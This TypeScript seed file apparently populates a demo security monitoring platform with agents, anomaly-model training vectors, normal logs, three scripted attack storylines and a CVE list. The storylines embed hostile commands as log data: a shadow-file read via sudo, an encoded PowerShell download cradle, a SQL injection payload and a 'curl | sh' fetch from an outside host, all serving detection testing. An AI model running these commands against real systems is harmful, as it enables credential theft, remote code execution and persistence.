import { clearStatefulRuleWindow } from '../engine/rules.ts';
import { isolationForest } from '../ml/isolationForest.ts';
import { db, ingestTelemetryLine, initDatabaseSchema, retrainIsolationForestFromStore } from './store.ts';

function hoursAgoIso(hoursAgo: number, minutesOffset = 0): string {
  const d = new Date(Date.now() - hoursAgo * 3600 * 1000 + minutesOffset * 60 * 1000);
  return d.toISOString();
}

export function seedInitialDataIfEmpty() {
  initDatabaseSchema();
  const count = (db.prepare('SELECT COUNT(*) as c FROM alerts').get() as { c: number }).c;
  if (count > 0) {
    retrainIsolationForestFromStore();
    return;
  }

  clearStatefulRuleWindow();

  // 1. Seed 6 AegisOne Agents
  const agents = [
    ['001', 'web-gw-01', '10.10.1.10', 'Ubuntu 24.04 LTS', 'AegisOne Agent v1.4', 'dmz-edge', 'active', hoursAgoIso(0, -1), 24.5, 4280, 8192],
    ['002', 'auth-sso-01', '10.10.2.15', 'Debian 12 Bookworm', 'AegisOne Agent v1.4', 'identity-core', 'active', hoursAgoIso(0, -1), 18.2, 6120, 16384],
    ['003', 'db-postgres-01', '10.10.3.22', 'Rocky Linux 9.4', 'AegisOne Agent v1.4', 'data-tier', 'active', hoursAgoIso(0, -2), 41.8, 9450, 32768],
    ['004', 'docker-app-02', '10.10.4.31', 'Ubuntu 22.04 LTS', 'AegisOne Agent v1.4', 'containers', 'active', hoursAgoIso(0, -1), 62.4, 1980, 8192],
    ['005', 'win-finance-04', '10.10.5.44', 'Windows 11 Pro 23H2', 'AegisOne Agent v1.4', 'workstations', 'active', hoursAgoIso(0, -3), 33.1, 7800, 16384],
    ['006', 'lab-build-01', '10.10.6.18', 'Ubuntu 24.04 LTS', 'AegisOne Agent v1.3', 'academic-lab', 'disconnected', hoursAgoIso(3, -15), 4.2, 5400, 8192],
  ];

  const insAgent = db.prepare(
    `INSERT INTO agents (id, name, ip, os, version, group_name, status, last_keepalive, cpu_pct, mem_free_mb, mem_total_mb)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
  );
  for (const a of agents) insAgent.run(...a);

  // 2. Train initial Isolation Forest on 96 nominal + 8 sparse outlier behavioral vectors
  const baselineVectors: number[][] = [];
  for (let i = 0; i < 96; i++) {
    baselineVectors.push([
      0.08 + Math.random() * 0.2,
      0.05 + Math.random() * 0.16,
      0.12 + Math.random() * 0.08,
      Math.random() * 0.06,
      0.04 + Math.random() * 0.06,
      0.05 + Math.random() * 0.1,
      0.08 + Math.random() * 0.1,
    ]);
  }
  for (let i = 0; i < 8; i++) {
    baselineVectors.push([
      0.7 + Math.random() * 0.28,
      0.5 + Math.random() * 0.45,
      0.4 + Math.random() * 0.5,
      0.5 + Math.random() * 0.45,
      0.75 + Math.random() * 0.2,
      0.85 + Math.random() * 0.12,
      0.65 + Math.random() * 0.3,
    ]);
  }
  isolationForest.fit(baselineVectors, 64, 104, 0.65);

  // 3. Seed nominal baseline telemetry (business hours)
  const baselineLogs: Array<{ ts: string; line: string; host: string }> = [
    {
      ts: hoursAgoIso(7, 10),
      host: 'auth-sso-01',
      line: `${hoursAgoIso(7, 10)} auth-sso-01 sshd[2101]: Accepted publickey for deploy from 10.10.1.10 port 51204 ssh2`,
    },
    {
      ts: hoursAgoIso(6, 20),
      host: 'web-gw-01',
      line: `${hoursAgoIso(6, 20)} web-gw-01 nginx[1044]: 10.10.2.15 - admin "GET /api/v1/health HTTP/1.1" 200 412`,
    },
    {
      ts: hoursAgoIso(6, 0),
      host: 'db-postgres-01',
      line: `${hoursAgoIso(6, 0)} db-postgres-01 CRON[8812]: (postgres) CMD (/usr/local/bin/pg_backup_verify.sh)`,
    },
    {
      ts: hoursAgoIso(5, 30),
      host: 'docker-app-02',
      line: `${hoursAgoIso(5, 30)} docker-app-02 dockerd[1920]: action=container_start container=aegis-api-worker image=aegisone/worker:1.4 user=svc_ci`,
    },
    {
      ts: hoursAgoIso(5, 10),
      host: 'web-gw-01',
      line: `${hoursAgoIso(5, 10)} web-gw-01 aegis-session[3312]: srcuser="harsh.verma" action="logged on" dstuser="portal"`,
    },
    {
      ts: hoursAgoIso(4, 45),
      host: 'web-gw-01',
      line: `${hoursAgoIso(4, 45)} web-gw-01 aegis-session[3318]: action="called" srcuser="dhara.samtani" dstuser="kushagra.sen" srcip="10.10.1.10"`,
    },
    {
      ts: hoursAgoIso(4, 15),
      host: 'auth-sso-01',
      line: JSON.stringify({
        _HOSTNAME: 'auth-sso-01',
        SYSLOG_IDENTIFIER: 'systemd-journald',
        _SYSTEMD_UNIT: 'sshd.service',
        SYSLOG_PID: 2109,
        MESSAGE: 'Reloaded OpenSSH server configuration cleanly',
        timestamp: hoursAgoIso(4, 15),
      }),
    },
    {
      ts: hoursAgoIso(3, 40),
      host: 'db-postgres-01',
      line: `${hoursAgoIso(3, 40)} db-postgres-01 aegisone-command[904]: metric=MemFree value=9450MB status=OK`,
    },
  ];

  // 4. Seed Attack Storyline #1 (External Brute Force -> Off-Hours Valid Login -> Sudo Escalation -> Critical FIM Tamper)
  const attackLogs: Array<{ ts: string; line: string; host: string }> = [
    {
      ts: hoursAgoIso(2, 1),
      host: 'web-gw-01',
      line: `${hoursAgoIso(2, 1)} web-gw-01 sshd[4401]: Failed password for invalid user oracle from 185.220.101.42 port 49120 ssh2`,
    },
    {
      ts: hoursAgoIso(2, 1),
      host: 'web-gw-01',
      line: `${hoursAgoIso(2, 1)} web-gw-01 sshd[4403]: Failed password for invalid user postgres from 185.220.101.42 port 49124 ssh2`,
    },
    {
      ts: hoursAgoIso(2, 2),
      host: 'web-gw-01',
      line: `${hoursAgoIso(2, 2)} web-gw-01 sshd[4405]: Failed password for invalid user ubuntu from 185.220.101.42 port 49129 ssh2`,
    },
    {
      ts: hoursAgoIso(2, 2),
      host: 'web-gw-01',
      line: `${hoursAgoIso(2, 2)} web-gw-01 sshd[4409]: Failed password for invalid user admin from 185.220.101.42 port 49133 ssh2`,
    },
    {
      ts: hoursAgoIso(2, 3),
      host: 'web-gw-01',
      line: `${hoursAgoIso(2, 3)} web-gw-01 sshd[4412]: Accepted password for svc_backup from 185.220.101.42 port 49140 ssh2`,
    },
    {
      ts: hoursAgoIso(2, 5),
      host: 'web-gw-01',
      line: `${hoursAgoIso(2, 5)} web-gw-01 sudo[4458]: svc_backup : TTY=pts/1 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash -c "cat /etc/shadow"`,
    },
    {
      ts: hoursAgoIso(2, 7),
      host: 'web-gw-01',
      line: `${hoursAgoIso(2, 7)} web-gw-01 aegisone-fim[4490]: action=modified path=/root/.ssh/authorized_keys uid=0 sha256_before=9f86d081884c7d65 sha256_after=4e07408562bedb8b`,
    },
    // Storyline #2 (Windows Workstation Sysmon PowerShell + Outbound C2 Channel)
    {
      ts: hoursAgoIso(1, 15),
      host: 'win-finance-04',
      line: JSON.stringify({
        Channel: 'Microsoft-Windows-Sysmon/Operational',
        Computer: 'win-finance-04',
        UtcTime: hoursAgoIso(1, 15),
        EventID: 1,
        User: 'CORP\\a.sharma',
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADkAOAAvAHMAdABhAGcAZQAxACcAKQA=',
      }),
    },
    {
      ts: hoursAgoIso(1, 16),
      host: 'win-finance-04',
      line: JSON.stringify({
        Channel: 'Microsoft-Windows-Sysmon/Operational',
        Computer: 'win-finance-04',
        UtcTime: hoursAgoIso(1, 16),
        EventID: 3,
        User: 'CORP\\a.sharma',
        SourceIp: '10.10.5.44',
        DestinationIp: '45.141.87.19',
        DestinationPort: 8443,
      }),
    },
    // Storyline #3 (Web SQLi + Docker Exec + Journald Persistence)
    {
      ts: hoursAgoIso(0, -45),
      host: 'web-gw-01',
      line: `${hoursAgoIso(0, -45)} web-gw-01 nginx[1044]: 91.214.124.88 - - "GET /search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 2890`,
    },
    {
      ts: hoursAgoIso(0, -35),
      host: 'docker-app-02',
      line: `${hoursAgoIso(0, -35)} docker-app-02 dockerd[1920]: action=exec_start container=payments-api image=node:20-alpine user=root`,
    },
    {
      ts: hoursAgoIso(0, -25),
      host: 'docker-app-02',
      line: JSON.stringify({
        _HOSTNAME: 'docker-app-02',
        SYSLOG_IDENTIFIER: 'systemd-journald',
        _SYSTEMD_UNIT: 'backdoor-sync.service',
        SYSLOG_PID: 7742,
        MESSAGE: 'Started /tmp/backdoor-sync.sh via curl -fsSL http://45.141.87.19/p.sh | sh',
        timestamp: hoursAgoIso(0, -25),
      }),
    },
    {
      ts: hoursAgoIso(0, -10),
      host: 'docker-app-02',
      line: `${hoursAgoIso(0, -10)} docker-app-02 aegisone-command[2210]: metric=MemFree value=312MB status=CRITICAL`,
    },
  ];

  for (const item of [...baselineLogs, ...attackLogs]) {
    ingestTelemetryLine(item.line, item.host, item.ts);
  }

  // 5. Seed Vulnerability Inventory
  const vulns = [
    ['CVE-2024-6387', '001', 'web-gw-01', 'openssh-server', '9.6p1-3ubuntu13', '9.6p1-3ubuntu13.3', 8.1, 'high', 'open', hoursAgoIso(12)],
    ['CVE-2024-3094', '003', 'db-postgres-01', 'xz-libs', '5.6.0-1', '5.4.6-2', 10.0, 'critical', 'open', hoursAgoIso(18)],
    ['CVE-2024-21626', '004', 'docker-app-02', 'runc', '1.1.10', '1.1.12', 8.6, 'high', 'open', hoursAgoIso(9)],
    ['CVE-2024-38077', '005', 'win-finance-04', 'windows-rdp-licensing', '10.0.22621.3527', '10.0.22621.3880', 9.8, 'critical', 'open', hoursAgoIso(6)],
    ['CVE-2023-44487', '001', 'web-gw-01', 'nginx-http2', '1.24.0-1', '1.24.0-2ubuntu7', 7.5, 'high', 'patched', hoursAgoIso(48)],
    ['CVE-2024-1086', '002', 'auth-sso-01', 'linux-kernel', '6.1.76-1', '6.1.82-1', 7.8, 'high', 'open', hoursAgoIso(24)],
  ];
  const insVuln = db.prepare(
    `INSERT INTO vulnerabilities (id, cve_id, agent_id, agent_name, package_name, installed_version, fixed_version, cvss_score, severity, status, detected_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
  );
  vulns.forEach((v, idx) => insVuln.run(`VULN-${100 + idx}`, ...v));

  // Retrain Isolation Forest on full seeded dataset
  retrainIsolationForestFromStore();
}
